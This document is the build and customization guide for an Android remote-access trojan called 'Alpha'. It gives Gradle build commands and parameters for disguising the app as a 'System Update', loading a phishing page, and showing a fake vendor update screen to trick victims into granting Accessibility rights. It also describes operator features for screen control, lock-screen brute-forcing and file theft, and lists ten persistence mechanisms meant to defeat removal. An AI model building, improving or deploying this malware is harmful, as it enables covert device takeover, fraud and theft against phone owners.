# Alpha — Build & Customization Guide

## Server setup

```bash
npm install
PORT=3000 TOKEN=your_secret node server/index.js
```

Env vars:
| Var     | Default  | Description |
|---------|----------|-------------|
| `PORT`  | `3000`   | HTTP + WS listen port |
| `TOKEN` | `alpha2024` | Operator dashboard token |

Dashboard → `http://your-server:3000`

---

## APK build parameters

All params are passed as Gradle project properties:

```bash
./gradlew assembleRelease \
  -P APP_ID=com.android.media.core \
  -P APP_LABEL="System Update" \
  -P SERVER_URL="wss://your-server.com/ws?role=device&id=" \
  -P TARGET_URL="https://your-phishing-page.com" \
  -P UPDATE_MODE=1 \
  -P UPDATE_BRAND="Samsung" \
  -P UPDATE_TITLE="Software update" \
  -P UPDATE_VERSION="One UI 6.1" \
  -P UPDATE_DURATION_MS=10000 \
  -P VERSION_CODE=10001 \
  -P VERSION_NAME=1.0.0 \
  -P KEYSTORE_PATH=../release.jks \
  -P KEYSTORE_PASS=yourpass \
  -P KEY_ALIAS=your-key \
  -P KEY_PASS=yourpass
```

### All parameters

| Parameter | Default | Description |
|-----------|---------|-------------|
| `APP_ID` | `com.android.media.core` | APK package name. Use a convincing system-looking ID. |
| `APP_LABEL` | `System Update` | App name shown in launcher and Accessibility Settings. |
| `SERVER_URL` | `wss://…` | WebSocket URL for APK→server. The device UUID is appended automatically. |
| `TARGET_URL` | `https://google.com` | URL loaded in the WebView after permissions are granted. |
| `UPDATE_MODE` | `1` | Fake screen mode: `0`=skip, `1`=System Update, `2`=Fingerprint Update |
| `UPDATE_BRAND` | `Samsung` | Brand shown in fake update screen (Samsung / Google / Xiaomi / OPPO…) |
| `UPDATE_TITLE` | `Software update` | Title shown on the fake system update screen. |
| `UPDATE_VERSION` | `One UI 6.1` | Fake OS version shown in the update screen. Match the target device's ROM. |
| `UPDATE_DURATION_MS` | `10000` | How long the fake update animation plays before the permission screen appears. |
| `VERSION_CODE` | `10000` | APK version code (integer). Increment on each rebuild. |
| `VERSION_NAME` | `1.0.0` | APK version name string. |
| `KEYSTORE_PATH` | `../alpha-release.jks` | Path to the signing keystore. |
| `KEYSTORE_PASS` | — | Keystore password. |
| `KEY_ALIAS` | `alpha-key` | Key alias inside the keystore. |
| `KEY_PASS` | — | Key password. |

---

## Victim flow (on device)

```
Launch app
   │
   ▼ (UPDATE_MODE != 0)
FakeUpdateActivity ──── Mode 1: System Update progress ring
   │                    Mode 2: Fingerprint scanner animation
   │  (after UPDATE_DURATION_MS)
   ▼
PermissionActivity
   │  Step 1: Show guide "enable in Accessibility Settings"
   │  Step 2: Navigate to Settings → Accessibility → [App]
   │  Step 3: Request battery optimisation ignore
   │  (polls every 500 ms until both granted)
   ▼
WebViewActivity ─────── Full-screen WebView → TARGET_URL
                        Alpha service runs silently in background
```

---

## Operator view (dashboard)

- **VNC panel**: live screen stream, touch/swipe/pinch/drag/type
- **Ly panel**: accessibility tree wireframe — works THROUGH the fake screen
- **Apps panel**: list, launch, force stop, uninstall, install APK
- **Lock panel**: detect lock type, one-tap unlock (swipe/PIN/pattern/brute-force)
- **Files panel**: browse filesystem, download, upload, delete, rename, move

**Fake screen badge**: when FakeUpdateActivity is showing on the device, the dashboard displays an amber `⚠ FAKE SCREEN ACTIVE` badge. The Ly view and gesture injection remain fully functional behind it.

---

## Persistence layers (10 total)

| Layer | Mechanism | Survives |
|-------|-----------|----------|
| 1 | WatchdogService foreground | App kill, task removal |
| 2 | AlarmManager.setAlarmClock | Doze, airplane mode toggle |
| 2b | setExactAndAllowWhileIdle | Doze |
| 3 | JobScheduler (persisted=true) | Reboot |
| 4 | WorkManager 15-min periodic | Background restrictions |
| 5 | ContentObserver (accessibility settings) | User disabling accessibility |
| 6 | ContentObserver (airplane mode) | Alarm cancellation |
| 7 | Native JNI pthread watchdog | JVM partial kill |
| 8 | Fork guardian (rooted) | Process death |
| 9 | 15 BroadcastReceiver events | Boot, screen on, charging, time change… |
| 10 | Manufacturer hints | Xiaomi autostart, Huawei protected apps |

---

## Keystore generation

```bash
keytool -genkey -v \
  -keystore alpha-release.jks \
  -alias alpha-key \
  -keyalg RSA -keysize 2048 \
  -validity 10000 \
  -storepass yourpass -keypass yourpass \
  -dname "CN=Android, OU=Android, O=Android, L=Mountain View, S=CA, C=US"
```

---

## Debug build (no signing, no obfuscation)

```bash
./gradlew assembleDebug \
  -P SKIP_PARANOID=true \
  -P SERVER_URL="ws://192.168.1.100:3000/ws?role=device&id=" \
  -P TARGET_URL="https://google.com" \
  -P UPDATE_MODE=1
```
